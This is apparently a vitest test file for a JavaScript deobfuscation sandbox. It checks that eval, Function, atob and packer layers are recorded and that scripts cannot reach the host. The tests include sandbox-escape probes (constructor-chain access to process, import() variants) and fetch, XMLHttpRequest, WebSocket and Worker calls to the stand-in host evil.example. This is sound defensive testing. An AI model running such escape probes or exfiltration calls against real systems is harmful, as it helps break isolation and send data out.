import { createContext, runInContext } from 'node:vm';
import { describe, expect, it } from 'vitest';
import { COMPILE_TYPES, installSandbox } from './_js-deobf-hooks';
import { LIMITS, lastCodeOf, runInNodeVm, type SandboxResult } from './_js-deobf-run';

// The prelude of the sandbox (the hooks) runs here inside a Node `vm` context: the same function,
// by its source text, in the realm of the script — which is what the worker does with its own
// global scope. These tests prove the logic; tests in e2e/js-deobfuscate.spec.ts prove the real
// browser worker. Nothing in this file passes a function from this realm into the context.

const run = (code: string, timeoutMs = 3000): Promise<SandboxResult> =>
  runInNodeVm(code, { timeoutMs });

const types = (r: SandboxResult) => r.layers.map((l) => l.type);
const alerts = (r: SandboxResult) =>
  r.events.filter((e) => e.kind === 'dialog' && e.name === 'alert').map((e) => e.detail);
const sinks = (r: SandboxResult) =>
  r.events.filter((e) => e.kind === 'sink').map((e) => `${e.name}: ${e.detail}`);

/**
 * A script that walks the values of the global object, of their properties and of their prototypes
 * (it calls no getter) and lists every function that does not have the scope's own Function.prototype
 * in its chain: a function of the host would not.
 */
const WALK = `
  var seen = [], functions = 0, foreign = [], FP = Function.prototype;
  function visit(o, path, depth) {
    if (o === null || (typeof o !== "object" && typeof o !== "function")) return;
    if (seen.indexOf(o) >= 0 || depth > 5) return;
    seen.push(o);
    if (typeof o === "function") {
      functions++;
      if (o !== FP && !FP.isPrototypeOf(o)) foreign.push(path);
    }
    var names = Object.getOwnPropertyNames(o);
    for (var i = 0; i < names.length; i++) {
      var d = Object.getOwnPropertyDescriptor(o, names[i]);
      if (d && "value" in d) visit(d.value, path + "." + names[i], depth + 1);
    }
    visit(Object.getPrototypeOf(o), path + ".__proto__", depth + 1);
  }
  visit(this, "global", 0);
  var summary = functions + " functions, foreign: " + foreign.join(",")
`;

const b64 = (s: string) => Buffer.from(s, 'latin1').toString('base64');

describe('layers', () => {
  it('Function(Function("return \'\\141\\75\\160\'")())() — the octal case', async () => {
    // The script text (single backslashes): Function(Function("return '\141\75\160'")())()
    const r = await run(`Function(Function("return '\\141\\75\\160'")())()`);
    expect(r.failure).toBe('');
    expect(r.layers).toEqual([
      { type: 'Function', input: "return 'a=p'", output: 'a=p', error: '' },
      { type: 'Function', input: 'a=p', output: '', error: 'ReferenceError: p is not defined' },
    ]);
    expect(r.finalCode).toBe('a=p');
    expect(r.scriptError).toBe('ReferenceError: p is not defined');
  });

  it('the same chain with the escapes still escaped inside the first body', async () => {
    // Function("return '\\141\\75\\160'") — the first body is  return '\141\75\160'
    const r = await run(`Function(Function("return '\\\\141\\\\75\\\\160'")())()`);
    expect(r.layers[0]).toEqual({
      type: 'Function',
      input: "return '\\141\\75\\160'",
      output: 'a=p',
      error: '',
    });
    expect(r.finalCode).toBe('a=p');
  });

  it('eval(atob(…)) two levels deep: the layers come in the order they happen', async () => {
    const inner = 'alert("FTF{two_levels}");';
    const middle = `eval(atob("${b64(inner)}"));`;
    const r = await run(`eval(atob("${b64(middle)}"));`);
    expect(types(r)).toEqual(['atob', 'eval', 'atob', 'eval']);
    expect(r.layers[0]!.input).toBe(b64(middle));
    expect(r.layers[0]!.output).toBe(middle);
    expect(r.layers[1]!.input).toBe(middle);
    expect(r.layers[2]!.input).toBe(b64(inner));
    expect(r.layers[2]!.output).toBe(inner);
    expect(r.layers[3]!.input).toBe(inner);
    expect(r.finalCode).toBe(inner);
    expect(alerts(r)).toEqual(['FTF{two_levels}']);
    expect(r.scriptError).toBe('');
  });

  it('(0)["constructor"]["constructor"](…)() is caught by the Function.prototype.constructor hook', async () => {
    const r = await run(`(0)['constructor']['constructor']("return 6 * 7")()`);
    expect(r.layers).toEqual([
      { type: 'Function', input: 'return 6 * 7', output: '42', error: '' },
    ]);
    expect(r.finalCode).toBe('return 6 * 7');
  });

  it('every way to reach a function constructor is a layer', async () => {
    const cases: [string, string][] = [
      ['new Function("return 1")', 'Function'],
      ['Function.prototype.constructor("return 1")', 'Function'],
      ['(function () {}).constructor("return 1")', 'Function'],
      ['[].map.constructor("return 1")', 'Function'],
      ['(() => 1).constructor("return 1")', 'Function'],
      ['Reflect.construct(Function, ["return 1"])', 'Function'],
      ['Function.apply(null, ["return 1"])', 'Function'],
      ['Function.call(null, "return 1")', 'Function'],
      ['new (class extends Function {})("return 1")', 'Function'],
      ['(function* () {}).constructor("yield 1")', 'GeneratorFunction'],
      ['(async function () {}).constructor("return 1")', 'AsyncFunction'],
      ['(async function* () {}).constructor("yield 1")', 'AsyncGeneratorFunction'],
      ['Object.getPrototypeOf(async () => {}).constructor("return 1")', 'AsyncFunction'],
    ];
    for (const [expr, type] of cases) {
      const r = await run(`var f = ${expr};`);
      expect(r.scriptError, expr).toBe('');
      if (type) {
        expect(types(r), expr).toEqual([type]);
        expect(COMPILE_TYPES).toContain(type);
      }
    }
  });

  it('eval called indirectly and through window/self still records', async () => {
    const r = await run(
      `(0, eval)("1+1"); window.eval("2+2"); self['eval']("3+3"); eval.call(null, "4+4")`,
    );
    expect(r.layers.map((l) => [l.type, l.input, l.output])).toEqual([
      ['eval', '1+1', '2'],
      ['eval', '2+2', '4'],
      ['eval', '3+3', '6'],
      ['eval', '4+4', '8'],
    ]);
  });

  it('unescape and decodeURIComponent are decoders; decodeURI is not a layer', async () => {
    const r = await run(
      `alert(unescape("%46%54%46%7B%u0041%7D")); alert(decodeURIComponent("%E2%9C%93"))`,
    );
    expect(r.layers.map((l) => [l.type, l.input, l.output])).toEqual([
      ['unescape', '%46%54%46%7B%u0041%7D', 'FTF{A}'],
      ['decodeURIComponent', '%E2%9C%93', '✓'],
    ]);
    expect(r.finalCode).toBe('✓');
  });

  it('a hooked decoder still throws what the original throws', async () => {
    const r = await run(`try { decodeURIComponent("%E0%A4%A") } catch (e) { alert(e.name) }`);
    expect(alerts(r)).toEqual(['URIError']);
    expect(r.layers[0]!.error).toContain('URIError');
  });

  it('a syntax error in a compiled string is a layer with its error, and still thrown', async () => {
    const r = await run(`try { eval("var = ;") } catch (e) { alert(e.name) }`);
    expect(alerts(r)).toEqual(['SyntaxError']);
    expect(r.layers[0]!.input).toBe('var = ;');
    expect(r.layers[0]!.error).toContain('SyntaxError');
  });

  it('what a compiled function returned is kept, even when it is called later', async () => {
    const r = await run(`var f = Function("return 'next layer'"); alert('before'); f(); f();`);
    expect(r.layers).toEqual([
      { type: 'Function', input: "return 'next layer'", output: 'next layer', error: '' },
    ]);
  });

  it('lastCodeOf takes the last compiled code, else the last output', () => {
    expect(
      lastCodeOf([
        { type: 'eval', input: 'a', output: '', error: '' },
        { type: 'atob', input: 'x', output: 'y', error: '' },
      ]),
    ).toBe('a');
    expect(lastCodeOf([{ type: 'atob', input: 'x', output: 'y', error: '' }])).toBe('y');
    expect(lastCodeOf([])).toBe('');
  });

  it('the list of compile types in the prelude is the exported one', () => {
    const src = installSandbox.toString();
    const m = /const COMPILE = \[([^\]]*)\]/.exec(src);
    expect(m).not.toBeNull();
    const names = [...m![1]!.matchAll(/['"`](\w+)['"`]/g)].map((x) => x[1]);
    expect(names).toEqual([...COMPILE_TYPES]);
  });
});

describe('the shapes obfuscators really have', () => {
  const BS = String.fromCharCode(92);

  it('a Dean Edwards packer: eval(function(p,a,c,k,e,d){…}(…)) gives the unpacked code as one layer', async () => {
    const packed =
      `eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};` +
      `if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'${BS}${BS}w+'};c=1};` +
      `while(c--)if(k[c])p=p.replace(new RegExp('${BS}${BS}b'+e(c)+'${BS}${BS}b','g'),k[c]);return p}` +
      `('0("1")',2,2,'alert|FTF{packed}'.split('|'),0,{}))`;
    const r = await run(packed);
    expect(r.scriptError).toBe('');
    expect(r.layers.map((l) => [l.type, l.input])).toEqual([['eval', 'alert("FTF{packed}")']]);
    expect(alerts(r)).toEqual(['FTF{packed}']);
  });

  it('the global-object probe of obfuscator.io code gets the sandbox, through two Function layers', async () => {
    const r = await run(
      `var g = Function('return (function() {}.constructor("return this")( ));')(); alert(String(g === this) + " " + typeof g.fetch);`,
    );
    expect(types(r)).toEqual(['Function', 'Function']);
    expect(alerts(r)).toEqual(['true function']);
  });

  it('its debug protection, (function(){}).constructor("debugger").call("action"), is a layer too', async () => {
    const r = await run(`(function () {}).constructor("debugger").call("action"); alert("after");`);
    expect(r.layers.map((l) => [l.type, l.input])).toEqual([['Function', 'debugger']]);
    expect(alerts(r)).toEqual(['after']);
  });

  it('a decoder loop that never ends after the last layer: the layers before it are kept by the worker, not by the vm', async () => {
    // The vm cannot report half a run; this only checks that the run ends at the limit.
    const r = await run(`eval(atob("YWxlcnQoMSk=")); for (;;) {}`, 300);
    expect(r.timedOut).toBe(true);
  });
});

describe('dialogs, console and the page', () => {
  it('alert, confirm, prompt and console are recorded, never shown', async () => {
    const r = await run(
      `alert("a"); var c = confirm("c?"); var p = prompt("p?", "d"); console.log("x", 1, {}); console.error("e");` +
        `alert(String(c) + " " + String(p))`,
    );
    expect(r.events.map((e) => `${e.kind}/${e.name}/${e.detail}`)).toEqual([
      'dialog/alert/a',
      'dialog/confirm/c?',
      'dialog/prompt/p?',
      'console/console.log/x 1 [object Object]',
      'console/console.error/e',
      'dialog/alert/false null',
    ]);
  });

  it('window is the global object', async () => {
    const r = await run(`alert(String(window === this) + " " + String(typeof self))`);
    expect(alerts(r)).toEqual(['true object']);
  });

  it('what the script throws is its own error, reported as text', async () => {
    const r = await run(`throw new TypeError("custom")`);
    expect(r.scriptError).toBe('TypeError: custom');
    expect(r.failure).toBe('');
  });

  it('document.write(unescape(…)): the decoded page is a layer, and nothing else of a page exists', async () => {
    const r = await run(`document.write(unescape("%3Cb%3EFTF%7Bpage%7D%3C/b%3E"))`);
    expect(r.layers).toEqual([
      {
        type: 'unescape',
        input: '%3Cb%3EFTF%7Bpage%7D%3C/b%3E',
        output: '<b>FTF{page}</b>',
        error: '',
      },
      { type: 'document.write', input: '<b>FTF{page}</b>', output: '', error: '' },
    ]);
    expect(r.scriptError).toBe('');
    expect(r.finalCode).toBe('<b>FTF{page}</b>');
  });

  it('a thrown object that cannot be printed does not break the report', async () => {
    const r = await run(`throw Object.create(null)`);
    expect(r.scriptError).toContain('unprintable');
  });
});

describe('the ways out are closed', () => {
  it('fetch, XMLHttpRequest, WebSocket, EventSource, Worker, importScripts, sendBeacon: recorded, nothing sent', async () => {
    const r = await run(`
      fetch("https://evil.example/a?x=1").catch(function () {});
      fetch({ url: "https://evil.example/req" }, { method: "POST" }).catch(function () {});
      var x = new XMLHttpRequest(); x.open("GET", "https://evil.example/xhr"); x.send("body");
      try { new WebSocket("wss://evil.example/ws"); } catch (e) { alert("ws " + e.message); }
      try { new EventSource("https://evil.example/es"); } catch (e) { alert("es"); }
      try { new Worker("https://evil.example/w.js"); } catch (e) { alert("worker"); }
      try { new SharedWorker("https://evil.example/sw.js"); } catch (e) { alert("shared"); }
      try { importScripts("https://evil.example/s.js"); } catch (e) { alert("is"); }
      var beacon = typeof navigator !== "undefined" && navigator.sendBeacon ? "yes" : "no";
    `);
    expect(r.scriptError).toBe('');
    expect(sinks(r)).toEqual([
      'fetch: https://evil.example/a?x=1',
      'fetch: POST https://evil.example/req',
      'XMLHttpRequest: GET https://evil.example/xhr',
      'XMLHttpRequest.send: body',
      'WebSocket: wss://evil.example/ws',
      'EventSource: https://evil.example/es',
      'Worker: https://evil.example/w.js',
      'SharedWorker: https://evil.example/sw.js',
      'importScripts: https://evil.example/s.js',
    ]);
    expect(alerts(r)).toEqual([
      'ws Blocked by the sandbox: WebSocket is not available here',
      'es',
      'worker',
      'shared',
      'is',
    ]);
  });

  it('fetch answers with a rejected promise, like a network failure, and sends nothing', async () => {
    const r = await run(
      `fetch("https://evil.example/").then(function () { alert("sent"); }, function (e) { alert(e.name + ": " + e.message); });`,
    );
    // The rejection handler runs as a microtask after the script, inside the same run.
    expect(sinks(r)).toEqual(['fetch: https://evil.example/']);
    expect(alerts(r).includes('sent')).toBe(false);
  });

  it('import("https://…") cannot be written: the word is renamed and the attempt recorded', async () => {
    const variants = [
      `import("https://evil.example/m.js").catch(function () {})`,
      `import ("https://evil.example/m.js").catch(function () {})`,
      `import/* c */("https://evil.example/m.js").catch(function () {})`,
      `import\n("https://evil.example/m.js").catch(function () {})`,
      `import//c\n("https://evil.example/m.js").catch(function () {})`,
      `import<!--c\n("https://evil.example/m.js").catch(function () {})`,
      `import\u2028("https://evil.example/m.js").catch(function () {})`,
      `[...[import("https://evil.example/m.js").catch(function () {})]]`,
      `eval('import("https://evil.example/m.js").catch(function () {})')`,
      `Function('return import("https://evil.example/m.js")')().catch(function () {})`,
      `(0, eval)("import" + "('https://evil.example/m.js').catch(function () {})")`,
    ];
    for (const code of variants) {
      const r = await run(code);
      expect(
        sinks(r).filter((s) => s.startsWith('import(): https://evil.example/m.js')),
        code,
      ).toHaveLength(1);
    }
  });

  it('the word import cannot be written with escapes either (a SyntaxError, so nothing runs)', async () => {
    const bs = String.fromCharCode(92);
    const code = `try { eval("${bs}${bs}u0069mport('https://evil.example/m.js')"); } catch (e) { alert(e.name); }`;
    const r = await run(code);
    expect(alerts(r)).toEqual(['SyntaxError']);
    expect(sinks(r).filter((s) => s.includes('evil.example'))).toEqual([]);
  });

  it('other words are left alone: important, imports, and a method called import', async () => {
    const r = await run(
      `var important = 1, imports = 2, o = { import: function () { return "ok"; } }; alert(important + imports + o.import());`,
    );
    expect(alerts(r)).toEqual(['3ok']);
    // The method and its key were renamed together; the note says so (and nothing was fetched).
    expect(sinks(r)).toEqual([
      'import(): the word "import" was renamed 2 time(s): no module can load',
    ]);
  });

  it('indexedDB, caches and the storage handles are gone', async () => {
    const r = await run(`alert(typeof indexedDB + " " + typeof caches)`);
    expect(alerts(r)).toEqual(['undefined undefined']);
  });
});

describe('a script cannot get out', () => {
  it('this.constructor.constructor("return this")() is the sandbox global, with nothing of the host', async () => {
    const r = await run(`
      var g = this.constructor.constructor("return this")();
      var report = [];
      report.push("same:" + (g === this));
      report.push("process:" + typeof g.process + typeof process);
      report.push("require:" + typeof g.require + typeof require);
      report.push("module:" + typeof g.module + typeof module);
      report.push("Buffer:" + typeof g.Buffer);
      var names = ["fetch", "XMLHttpRequest", "WebSocket", "importScripts", "EventSource", "Worker"];
      for (var i = 0; i < names.length; i++) {
        var f = g[names[i]];
        var how;
        if (typeof f !== "function") how = "undefined";
        else {
          try {
            var out = f("https://evil.example/" + names[i]);
            if (out && typeof out.then === "function") { out.then(null, function () {}); how = "rejects"; }
            else how = "inert";
          }
          catch (e) { how = "throws"; }
        }
        report.push(names[i] + ":" + how);
      }
      alert(report.join(" "));
    `);
    expect(r.scriptError).toBe('');
    expect(alerts(r)).toEqual([
      'same:true process:undefinedundefined require:undefinedundefined module:undefinedundefined Buffer:undefined fetch:rejects XMLHttpRequest:inert WebSocket:throws importScripts:throws EventSource:throws Worker:throws',
    ]);
    // Each probe was a recorded attempt, none went anywhere.
    expect(sinks(r).map((s) => s.split(':')[0])).toEqual([
      'fetch',
      'WebSocket',
      'importScripts',
      'EventSource',
      'Worker',
    ]);
    expect(r.layers.map((l) => l.type)).toEqual(['Function']);
  });

  it('every function reachable from the global scope was made in the sandbox itself', async () => {
    const r = await run(`${WALK}; alert(summary)`);
    expect(r.scriptError).toBe('');
    const [line] = alerts(r);
    expect(line).toMatch(/^\d+ functions, foreign: $/);
    expect(Number(/^(\d+)/.exec(line!)![1])).toBeGreaterThan(40);
  });

  it('control: the same walk does find a function that the host put in the scope', () => {
    const context = createContext({ leak: () => 1 });
    expect(runInContext(`${WALK}; summary`, context)).toMatch(/foreign: global\.leak,/);
  });

  it('no path from a function leads to the host: process cannot be reached', async () => {
    const probes = [
      `this.constructor.constructor("return process")()`,
      `(function () {}).constructor("return process")()`,
      `[].constructor.constructor("return process")()`,
      `(0, eval)("process")`,
      `Reflect.construct(Function, ["return process"])()`,
      `eval("typeof require === 'undefined' ? process : require('fs')")`,
    ];
    for (const code of probes) {
      const r = await run(
        `var out; try { out = ${code}; alert("got " + typeof out); } catch (e) { alert(e.name); }`,
      );
      expect(alerts(r), code).toEqual(['ReferenceError']);
    }
  });

  it('the stack trace cannot be turned into a way to see functions', async () => {
    const r = await run(`
      Error.prepareStackTrace = function (e, frames) { return "pwned"; };
      var s;
      try { null.x; } catch (e) { s = String(e.stack); }
      alert(String(s === "pwned") + " " + String(Error.prepareStackTrace));
    `);
    expect(alerts(r)).toEqual(['false undefined']);
  });

  it('what the script does to the built-ins does not stop the hooks from recording', async () => {
    const r = await run(`
      Array.prototype.push = function () { throw new Error("push"); };
      String.prototype.slice = function () { return "x"; };
      String.prototype.indexOf = function () { return -1; };
      String.prototype.charCodeAt = function () { return 0; };
      Reflect.apply = function () { throw new Error("apply"); };
      Object.defineProperty = function () { throw new Error("define"); };
      RegExp.prototype.test = function () { return false; };
      RegExp.prototype.exec = function () { return null; };
      JSON.stringify = function () { return "{}"; };
      Function("return 1")();
      eval("import('https://evil.example/late.js').catch(function () {})");
    `);
    expect(r.scriptError).toBe('');
    expect(types(r)).toEqual(['Function', 'eval']);
    expect(sinks(r).filter((s) => s.startsWith('import()'))[0]).toBe(
      'import(): https://evil.example/late.js',
    );
  });

  it('a script that deletes the hooks gets nothing native behind them', async () => {
    const r = await run(`
      delete globalThis.eval; delete globalThis.Function; delete globalThis.fetch;
      var back = [typeof eval, typeof Function, typeof fetch];
      var viaProto;
      try { viaProto = (function () {}).constructor("return 1")(); } catch (e) { viaProto = e.name; }
      alert(back.join(",") + " " + viaProto);
    `);
    // eval and Function are gone, and the constructor reached through a function is still the hook.
    expect(alerts(r)).toEqual(['undefined,undefined,undefined 1']);
    expect(types(r)).toEqual(['Function']);
  });
});

describe('bounds', () => {
  it('while (1) {} is cut by the time limit', async () => {
    const t0 = Date.now();
    const r = await run('while (1) {}', 300);
    expect(r.timedOut).toBe(true);
    expect(Date.now() - t0).toBeLessThan(2000);
  });

  it('a loop after some layers (the vm keeps no partial result: the worker does)', async () => {
    const r = await run('eval("1"); while (1) {}', 300);
    expect(r.timedOut).toBe(true);
  });

  it('a huge value is cut to a size, and the cut is said', async () => {
    const r = await run(`eval("'x'.repeat(5000000)")`);
    expect(r.layers[0]!.output.length).toBeLessThan(LIMITS.text);
    expect(r.layers[0]!.output).toContain('chars]');
  });

  it('thousands of decodes keep the first layers and count the rest', async () => {
    const r = await run(`for (var i = 0; i < 5000; i++) atob("YQ==");`);
    // The vm has no atob of its own: the test harness gives it one, the loop still ends.
    expect(r.layers.length).toBeLessThanOrEqual(300);
    expect(r.dropped).toBeGreaterThan(4000);
  });

  it('a megabyte of script is read and run without trouble', async () => {
    const big = `/*${'x'.repeat(1_000_000)}*/ alert("big");`;
    const t0 = Date.now();
    const r = await run(big);
    expect(alerts(r)).toEqual(['big']);
    expect(Date.now() - t0).toBeLessThan(5000);
  });

  it('the word import in a megabyte is renamed in linear time', async () => {
    const big = `var s = "${'import '.repeat(150_000)}"; alert(s.length);`;
    const t0 = Date.now();
    const r = await run(big);
    // Each word became __imp__ (one character longer): the text of a string is changed, said below.
    expect(alerts(r)).toEqual(['1200000']);
    expect(sinks(r).at(-1)).toContain('150000 time(s)');
    expect(Date.now() - t0).toBeLessThan(5000);
  });
});
